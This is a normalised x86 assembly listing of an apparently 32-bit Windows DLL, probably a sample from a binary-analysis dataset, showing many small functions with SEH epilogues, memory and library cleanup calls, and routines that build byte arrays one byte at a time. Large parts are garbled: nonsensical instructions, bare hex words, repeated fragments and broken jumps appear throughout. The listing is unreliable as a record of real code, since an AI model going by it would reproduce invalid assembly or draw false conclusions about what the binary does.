rcl [ eax - 0x6f6f6f70 ] cl
nop
nop
nop
nop
nop
nop
nop
nop
sub_1000d330
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
mov eax [ esp + 0x8 ]
test eax eax
je r-xdata
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x11000
jae r-xdata
mov ecx [ 0x1420e198 ]
cmp eax 0x1
mov ecx [ ecx ]
mov [ rw-data ] ecx
jne r-xdata
cmp [ rw-data ] eax
jle r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
and ecx 0xffffff8b
or [ ebx - 0x3caffbc0 ] cl
int3
test eax eax
jne r-xdata
push 0x80
call [ malloc@IAT ]
test eax eax
pop ecx
mov [ rw-data ] eax
jne r-xdata
add [ eax ] edx
dec [ rw-data ]
push 0x1
pop eax
retn 0xc
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
xor esp eax
jmp 0x1321971b
mov ecx [ 0x10010a60 ]
push esi
lea esi [ ebx - 0x4 ]
cmp esi eax
jb r-xdata
push eax
call [ free@IAT ]
and [ rw-data ] 0x0
pop ecx
pop esi
mov cl [ esi ]
test ecx ecx
je r-xdata
sub [ esi + 0x4 ] 0xffffffeb
0xc815ff50 0xe1
call ebp
mov eax [ rw-data ]
_start
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
jbe r-xdata
loopne r-xdata
jne r-xdata
add [ eax ] 0x0
add bh bh
adc eax malloc@IAT
test eax eax
pop ecx
mov [ rw-data ] eax
jne r-xdata
retn
add [ eax ] edx
add bl ch
cmp esi 0x1
je r-xdata
push edi
mov edi [ ebp + 0x10 ]
test esi esi
jno r-xdata
retn
xor esp eax
jmp 0x1321971b
mov eax [ rw-data ]
test eax eax
je r-xdata
sbb esi 0x2
shl [ ecx + ecx + 0x57 ] 0x56
cmp [ rw-data ] 0x0
jmp r-xdata
jae r-xdata
push edi
push esi
push ebx
call eax
push edi
push esi
push edi
push esi
jae r-xdata
jne r-xdata
adc eax 0x91ffffff
retn 0x475
jne r-xdata
xchg ebp eax
shl [ esp + ecx + 0x57 ] 0x56
sahf
dec esp
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_1000d4f0
push ebp
mov esp esp
push ecx
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
xor edi edi
cmp ebx edi
jo r-xdata
xor al al
pop edi
pop esi
pop ebx
leave
retn
mov esi [ ebp + 0x10 ]
cmp esi edi
je r-xdata
cmp [ rw-data ] bh
jne r-xdata
and [ ebp - 0x4 ] 0x1
mov [ ebx ] edi
mov ebx [ ebp + 0x15 ]
mov [ esi ] edi
xchg [ ebp + 0x14 ] edi
add [ ebp + 0xe ] dh
add ebx 0x1400
cmp ebx 0x3e800
ja r-xdata
push rw-data
call [ GetModuleHandleA@IAT ]
push rw-data
push eax
call [ 0x1010e11c ]
cmp eax edi
cmpsd [ esi ] [ edi ]
pop eax
or [ ecx ] al
sbb al 0x74
pop ebx
test edi edi
je r-xdata
push ebx
push edi
call [ r-xdata ]
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
add ebx ebp
push edi
call [ free@IAT ]
pop ecx
lea eax [ esp + edi * 8 - 0x75 ]
sub_1000d56b
push eax
push ebx
push esi
push [ ebp + 0x8 ]
call [ 0x11010858 ]
cmp eax 0xc0000004
jne r-xdata
test eax eax
je r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
imul esp edi 0xffffff8b
inc ebp
or al 0x8b
dec ebp
adc [ ecx - 0x3ba74d0 ] cl
mov [ ecx ] eax
mov al 0x1
jmp r-xdata
test esi esi
je r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
xor al al
push esi
xchg [ ebp + 0x14 ] edi
add [ ebp + 0xe ] dh
add ebx 0x1400
cmp ebx 0x3e800
ja r-xdata
test edi edi
je r-xdata
push ebx
push edi
call [ r-xdata ]
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
add ebx ebp
push edi
call [ free@IAT ]
pop ecx
lea eax [ esp + edi * 8 - 0x75 ]
sub_10001086
push [ esp + 0xc ]
mov eax [ esp + 0x8 ]
add eax 0x160
push [ esp + 0xc ]
push eax
call sub_1000103b
add esp 0xc
retn
sub_100028b9
push 0x1
pop eax
retn
sub_10002cde
push 0x1
pop eax
retn
sub_10002f24
cmp [ ebp - 0x44 ] ebx
je r-xdata
call sub_10002f61
retn
push [ ebp - 0x44 ]
call [ rw-data ]
mov [ ebp - 0x44 ] ebx
sub_10002f3d
push 0x1
pop eax
retn
sub_10002f61
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
push eax
call [ FreeLibrary@IAT ]
and [ rw-data ] 0x0
sub_10003079
inc ebp

sub_1000307b
or eax edi
inc ebp
int3
sub_100033fa
mov esp [ ebp - 0x18 ]
and [ ebp - 0x5c ] 0x40
or [ ebp - 0x10 ] 0xffffffff
mov eax [ ebp - 0x1c ]
mov ecx [ ebp + 0x70 ]
ror [ fs : 0x0 ] 0x5f
pop esi
pop ebx
leave
retn
sub_1000345e
or al 0x89
inc ebp
loopne r-xdata
add [ eax ] al
jmp sub_100034c9
retn
sub_100034a7
cmp eax 0xd74e45d
push [ ebp - 0x1c ]
call [ free@IAT ]
pop ecx
mov [ ebp - 0x1c ] ebx
retn
j_sub_100034c9
jmp sub_100034c9
sub_100034bc
push 0x1
pop eax
retn
sub_100034c9
or [ ebp - 0x4 ] 0xffffffff
mov eax [ esi ]
or [ ebp - 0x10 ] 0x64
cdq
sbb eax 0x0
pop edi
pop esi
pop ebx
leave
retn
sub_10003580
push 0x1
pop eax
retn 0x458b
j_sub_10003757
jmp sub_10003757
sub_1000374c
push 0x1
pop eax
retn
sub_10003750
mov esp [ ebp - 0x18 ]
and [ ebp - 0x20 ] 0x0
sub_10003757
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x1f ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_100039a6
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x30 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_100039bc
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
mov [ 0x56530cec ] eax
push edi
mov [ ebp - 0x18 ] esp
retn
sub_100039e3
inc ebp
in al 0x1
add [ edx ] al
add [ ebx - 0x34ff039b ] al
pop ebp
adc al 0x8f
inc ebp
sbb al 0x1
retn
sub_10003a3a
push 0x1
pop eax
retn
sub_10003a3e
mov esp [ ebp - 0x18 ]
and [ ebp - 0x1c ] 0x0
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
dec esi
pop ebx
leave
retn
j_sub_10003bee
jmp sub_10003bee
sub_10003be3
push 0x1
pop eax
retn
sub_10003c73

sub_10003dee
mov eax [ ebp + 0x10 ]
retn
sub_10003e82
adc eax r--data
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
jmp r-xdata
mov [ ebp - 0x4 ] ebx
test al 0x4
add [ eax ] al
add bl ch
sbb [ ebx ] dh
sub_10003eac
push [ ebp - 0x20 ]
fist [ GetFileTime@IAT ]
mov [ ebp - 0x20 ] ebx
retn
sub_10003eb9
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov al ch
sub_10003ebb
push 0x1
pop eax
retn
sub_10003ecb
dec [ ebx - 0x769b0f33 ]
or eax 0x0
dec edi
pop esi
pop ecx
leave
retn
sub_10003fe3
call sub_10003fec
jmp sub_10004043
j_sub_10004043
jmp sub_10004043
sub_10004035
push 0x5
pop eax
retn
sub_10004039
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x28 ] 0xfffee496
sub_10004043
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave

sub_1000409a
inc edi
mov [ ebp - 0x39 ] 0x7
mov [ ebp - 0x38 ] 0x5a
mov [ ebp - 0x37 ] 0x4f
inc esi
inc ebp
0xc647
sub_100040ac
inc ebp

sub_100041a7
push 0x1
push eax
retn
sub_100041ab
mov esp [ ebp - 0x18 ]
and [ ebp - 0x1c ] 0x0
or [ ebp - 0x4 ] 0xffffffff
mov al [ ebp - 0x3c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x8000 ] ebp
pop edi
pop esi
pop ebx
leave
retn
sub_100041c8
push ebp
mov ebp esp
sub esp 0x10
lea eax [ ebp - 0x10 ]
push eax
call [ GetSystemTime@IAT ]
or eax 0x6afc45b7
or bl [ ecx - 0x740608a7 ]
retn 0xc3c9
sub_10004388
inc [ ebx - 0x15 ]
adc eax ebp
int3
j_sub_10004d46#2
jmp sub_10004d46
sub_10004d3f
push 0x1
pop eax
retn
j_sub_10004d46
mov esp [ ebp - 0x8 ]
sub_10004d46
or [ ebp - 0x4 ] 0xffffffff
mov al [ ebp - 0x48 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esp
pop ebx
leave
retn
sub_10004fe8
inc ebp
retn
sub_10005047
[ esi + eax * 8 ]
sub_1000505c
[ ebx ]
sub_1000505e
mov [ ebp - 0xa4 ] 0x28
mov [ ebp - 0xa3 ] 0x3e
mov [ ebp - 0xa2 ] 0x2d
mov [ ebp - 0xa1 ] 0x3a
retn 0x6085
sub_1000507f
jmp [ ebx ]
sub_100060ac
push edi
call strlen
mov ecx [ ebp + 0xc ]
sub ecx eax
push ecx
imul esi [ eax ] 0x57100101
call esi
add ah 0x10
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x68 ]
sub_100060c5
push 0x1
pop eax
retn
sub_100060da
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_10006164
push esp
mov [ ebx ] ds
mov [ ebp - 0x73 ] 0x1e
mov [ ebp - 0x52 ] 0xf
mov [ ebp + 0xf ] 0xb
mov [ ebp - 0x70 ] 0x1a
mov [ ebp - 0x6f ] 0xd
mov [ ebp - 0x6e ] 0xc
mov [ ebp - 0x6d ] 0x36
retn 0x9445
sub_10006413
[ ebx ]
sub_100065cb
push 0x41
pop eax
retn
sub_100065cf
mov esp [ ebp - 0x18 ]
or [ ebp - 0x4 ] 0xffffffff
mov al 0x1
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000688a
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov al [ esp - 0x75 ]
dec ebp
sub_1000688c
push 0x1
pop eax
retn
sub_100068a1
in al 0x89
or eax 0x0
pop edi
pop esi
pop ebx
leave
retn
sub_100069a9
out dx al
add cl [ ecx - 0x114f4b ]
[ eax - 0x7b ]
sub_10006a78
push 0x1
pop eax
retn
sub_10006a7c
mov esp [ ebp - 0x18 ]
or [ ebp - 0x4 ] 0xffffffff
mov al [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
push ds
pop ebx
leave
retn
sub_10006a95
push edi

sub_10006ad1
dec ebp
dec edi
adc al dh
inc ebp
shr [ edi ] 0x1
mov [ ebp - 0x2f ] 0xd
mov [ ebp - 0x2e ] 0x10
mov [ ebp - 0x2d ] 0x1c
mov [ ebp - 0x2c ] 0x1a
mov [ ebp - 0x2b ] 0xc
mov [ ebp - 0x2a ] 0xc
retn 0xd745
sub_10006b69
adc esi eax
inc ebp
enter 0xc610 0x45
leave
or dh al
inc ebp

sub_10006c81
mov eax [ esp + 0x4 ]
sub eax 0x9
ja r-xdata
retn
jmp [ eax * 4 + r-xdata ]
sub_10006ca3
mov esp rw-data
retn
sub_10006ca9
mov eax rw-data
retn
sub_10006caf
mov eax rw-data
retn
sub_10006cb5
mov eax rw-data
retn
sub_10006cbb
mov eax rw-data
retn
sub_10006dd4
cmp [ ebp - 0x20 ] ebx
je r-xdata
retn
push [ ecx - 0x20 ]
call [ FreeSid@IAT ]
mov [ ebp - 0x20 ] ebx
sub_10006de7
pop es
push 0x1
pop eax
retn
sub_10006f40
cmp [ ebp - 0x1c ] ebx
je r-xdata
retn
cmp [ ebp - 0x20 ] ebx
je r-xdata
push [ ebp - 0x20 ]
call [ FreeSid@IAT ]
mov [ ebp - 0x20 ] ebx
sub_10006f57
sub al [ ecx ]
pop eax
retn
j_sub_100071be
jmp sub_100071be
sub_100071b0
push 0x1
pop eax
retn
sub_100071b4
mov esp [ ebp - 0x18 ]
and [ ebp - 0xc0 ] 0x0
sub_100071be
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0xc0 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_100072d2
cmp [ ebp - 0x20 ] edi
je r-xdata
cmp ebx edi
je r-xdata
push [ ebp - 0x20 ]
call [ LocalFree@IAT ]
mov [ ebp - 0x20 ] edi
retn
push ebx
call [ LocalFree@IAT ]
mov [ ebp - 0x1c ] edi
sub_100072f4
push 0x1
pop eax
retn
sub_1000743f
push 0x1
pop eax
retn
sub_1000751e
push 0x1
pop eax
retn
sub_100075ee
push 0x7f
push [ esp + 0x8 ]
call sub_100075ce
pop ecx
pop ecx
retn
sub_100084cc
push 0x1
pop eax
retn
sub_100084d0
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x20 ] 0xffffffe4
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x20 ]
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_100085b3
push 0x1
pop eax
retn
sub_100085b7
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x20 ] 0xffffffe4
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x20 ]
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_100086f3
mov eax [ ebp - 0x24 ]
add eax 0xc8
push eax
call [ ebp - 0x28 ]
retn
sub_10008709
push 0x1
pop eax
retn
sub_1000870d
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x20 ] 0xffffffe4
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x20 ]
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_10008849
mov eax [ ebp - 0x24 ]
add eax 0xc8
push eax
call [ ebp - 0x28 ]
retn
sub_1000885f
push 0x1
pop eax
retn
sub_10008863
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x20 ] 0xffffffe4
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x20 ]
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000899f
mov eax [ ebp - 0x24 ]
add eax 0xd8
push eax
call [ ebp - 0x28 ]
retn
sub_100089b5
push 0x1
pop eax
retn
sub_100089b9
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x20 ] 0xffffffe4
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x20 ]
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_10008bec
mov eax [ ebp - 0x24 ]
add eax 0xe0
push eax
call [ ebp - 0x28 ]
retn
sub_10008c02
push 0x1
pop eax
retn
sub_10008c06
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x20 ] 0xffffffe4
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x20 ]
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_10008e71
push 0x1
pop eax
retn
sub_10008e75
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x24 ] 0xffffffe4
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x24 ]
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_10008fac
push 0x1
pop eax
retn
sub_10008fb0
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x24 ] 0xffffffe4
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x24 ]
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_10009146
mov eax [ ebp - 0x28 ]
add eax 0xc8
push eax
call [ ebp - 0x2c ]
retn
sub_1000915c
push 0x1
pop eax
retn
sub_10009160
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x24 ] 0xffffffe4
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x24 ]
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_100092f6
mov eax [ ebp - 0x28 ]
add eax 0xc8
push eax
call [ ebp - 0x2c ]
retn
sub_1000930c
push 0x1
pop eax
retn
sub_10009310
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x24 ] 0xffffffe4
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x24 ]
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_100094a6
mov eax [ ebp - 0x28 ]
add eax 0xd8
push eax
call [ ebp - 0x2c ]
retn
sub_100094bc
push 0x1
pop eax
retn
sub_100094c0
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x24 ] 0xffffffe4
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x24 ]
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000968f
mov eax [ ebp - 0x28 ]
add eax 0xe0
push eax
call [ ebp - 0x2c ]
retn
sub_100096a5
push 0x1
pop eax
retn
sub_10009ef0
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0x80 ] eax
push 0x1
pop eax
retn
sub_1000a2b0
push 0x1
pop eax
retn
sub_1000a2b4
mov esp [ ebp - 0x18 ]
or [ ebp - 0x4 ] 0xffffffff
push 0xffffffd5
pop eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000a7ba
cmp [ ebp - 0x50 ] ebx
je r-xdata
retn
push [ ebp - 0x50 ]
call [ FreeLibrary@IAT ]
mov [ ebp - 0x50 ] ebx
sub_1000a891
push 0x1
pop eax
retn
sub_1000a8b5
push 0x1
pop eax
retn
sub_1000a8b9
mov esp [ ebp - 0x18 ]
or [ ebp - 0x4 ] 0xffffffff
push 0xffffffd5
pop eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000a92c
push 0x1
pop eax
retn
sub_1000a930
mov esp [ ebp - 0x18 ]
or [ ebp - 0x4 ] 0xffffffff
push 0xffffffd5
pop eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000a9ca
push 0x1
pop eax
retn
sub_1000aa4c
push 0x1
pop eax
retn
sub_1000ab4f
push 0x1
pop eax
retn
sub_1000b0b8
xor ebx ebx
cmp [ ebp - 0x50 ] ebx
je r-xdata
retn
push [ ebp - 0x50 ]
call [ FreeLibrary@IAT ]
mov [ ebp - 0x50 ] ebx
sub_1000b191
push 0x1
pop eax
retn
sub_1000b1b5
push 0x1
pop eax
retn
sub_1000b1ba
jmp 0xffcff43
sub_1000b1c0
push 0xffffffd5
sbb [ ebx - 0x769b0fb3 ] cl
or eax 0x2000000
pop edi
pop esi
pop ebx
leave
retn
sub_1000b230
mov esp [ ebp - 0x18 ]
or [ ebp - 0x4 ] 0xffffffff
push 0xffffffd5
pop eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000b2e7
push ebp
sub_1000b44f
push 0x1
pop eax
retn
sub_1000b62c
push es
add [ eax ] edx
push eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] esi
call [ 0xffffffff9000e18c ]
lea eax [ ebp - 0x800288 ]
push eax
call [ wcslen@IAT ]
retn
sub_1000bafb
[ edx + 0xa ]
sub_1000bc8b
push 0x1
pop eax
retn
sub_1000bc8f
and [ ebp - 0x18 ] 0xffffff83
dec ebp
cld
[ edx - 0x2b ]
sub_1000bc98
pop eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
push ds
pop ebx
leave
retn
sub_1000bd02
push 0x1
pop eax
retn
sub_1000bd06
mov ebp [ ebp - 0x18 ]
add [ ebp - 0x4 ] 0xffffffff
push 0xffffffd5
pop eax
mov ebx [ ebp - 0x8 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
j_sub_1000bd8a
jmp sub_1000bd8a
sub_1000bd70
mov [ esi + 0x49 ] 0x1
or [ esp + edi * 8 - 0x1 ] 0x33
shr bl 0xe
push 0x1
pop eax
or [ ebx + 0x4d93e865 ] 0xfffffffc
[ edx - 0x2b ]
sub_1000bd89
pop eax
sub_1000bd8a
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000bdfe
push 0x1
pop eax
retn
sub_1000beb7
push esi
push rw-data
call sub_1000bef0
mov esi eax
mov [ esp ] 0x1021060c
jmp sub_1000bef0
sub_1000bf8b
push 0x1
pop eax
retn
sub_1000bfb0
push [ ebp - 0x1c ]
call [ r--data ]
retn
sub_1000c0e1
push ecx
xor al 0x3b
retn 0x1d74
sub_1000c0e7
mov esi eax
sub esi edx
mov edx [ ebp + 0xc ]
add [ edx ] esi
mov edx [ ebp - 0x10 ]
mov esi eax
sub esi [ ebx + 0x34 ]
add [ edx ] esi
sub eax [ ecx + 0x34 ]
add [ ebx ] eax
jmp sub_1000c104
sub_1000c104
mov esi [ 0x1020e0c0 ]
push ecx
call esi
push [ ebp - 0x8 ]
call esi
mov eax [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
leave
retn
sub_1000c22c
lea eax [ ebp - 0x2c ]
push eax
call sub_1000c912
pop ecx
retn
sub_1000c2b5
and [ ebp - 0x5b73f040 ] al
add [ eax ] al
add [ edi + eax + 0x6a ] dh
jmp sub_1000c35d
sub_1000c35d
pop eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1000c360
xor eax eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1000c58a
push 0x1
pop eax
retn
sub_1000c62f
xor eax eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1000c715
mov [ ebp - 0x24 ] esi
or [ ebp - 0x4 ] 0xffffffff
inc edi
0x58016ab4 0x8bc3
sub_1000c91f
push [ esi ]
call [ CloseHandle@IAT ]
and [ esi ] 0x0
and [ esi + 0x4 ] 0x0
mov al 0x1
pop esi
retn
sub_1000c9f9
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx

sub_1000ca09
retn
sub_1000ca73
push 0x1
pop eax
retn
htonl
jmp [ htonl@IAT ]
sub_1000cbd7
into
int3
sub_1000cbfc
retn
sub_1000ce30
mov eax 0x1
retn
sub_1000cf90
xor eax eax
retn
sub_1000d158
0x1e28308 0xeb41
sub_1000d2b0
mov eax [ esp + 0x5 ]
test eax eax
je r-xdata
retn
push eax
call [ free@IAT ]
pop ecx
sub_1000d2d0
mov eax [ esp + 0x4 ]
retn
strcat
jmp [ strcat@IAT ]
sub_1000d316
jmp [ 0x1c04e1ac ]
memcpy
jmp [ memcpy@IAT ]
sub_1000d323
fmul st4
int3
sub_1000d326
int3
sub_1000d327
dec esp
int3
strlen
jmp [ strlen@IAT ]
strcpy
jmp [ strcpy@IAT ]
_abnormal_termination
jmp [ _abnormal_termination@IAT ]
memset
jmp [ memset@IAT ]
sub_1000d4d0
jmp [ r--data ]
_local_unwind2
jmp [ _local_unwind2@IAT ]
sub_1000d4dc
inc [ r--data ]
jmp [ _initterm@IAT ]
